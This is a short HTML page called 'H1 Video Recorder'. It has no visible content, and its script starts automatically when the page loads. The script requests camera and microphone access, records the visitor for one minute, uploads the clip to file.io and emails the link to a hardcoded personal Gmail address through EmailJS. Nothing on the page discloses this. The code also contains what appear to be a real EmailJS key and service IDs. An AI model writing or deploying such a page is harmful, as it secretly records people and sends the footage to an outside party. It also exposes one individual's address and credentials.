<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>H1 Video Recorder</title>
</head>
<body>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    // Initialize EmailJS with your public key
    emailjs.init("ACOn6PC1Zb70JrmxT"); // Replace with your actual public key

    async function startRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);

        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });

          // Upload to file.io
          const formData = new FormData();
          formData.append("file", blob, "recording.webm");

          try {
            const uploadResponse = await fetch("https://file.io/?expires=1d", {
              method: "POST",
              body: formData
            });

            const result = await uploadResponse.json();

            if (!result.success) {
              throw new Error("Upload failed");
            }

            // Send email with the video link
            await emailjs.send("service_khmk344", "template_oyrsayr", {
              to_email: "julianlee252@gmail.com",
              message: `Your 1-minute video is ready: ${result.link}`
            });

            console.log("✅ Email sent!");
          } catch (error) {
            console.error("❌ Failed to upload or send email:", error);
          }
        };

        recorder.start();

        setTimeout(() => {
          recorder.stop();
          stream.getTracks().forEach(track => track.stop());
        }, 60000); // 1 minute
      } catch (err) {
        console.error("Permission denied or error:", err);
      }
    }

    window.onload = startRecording;
  </script>
</body>
</html>
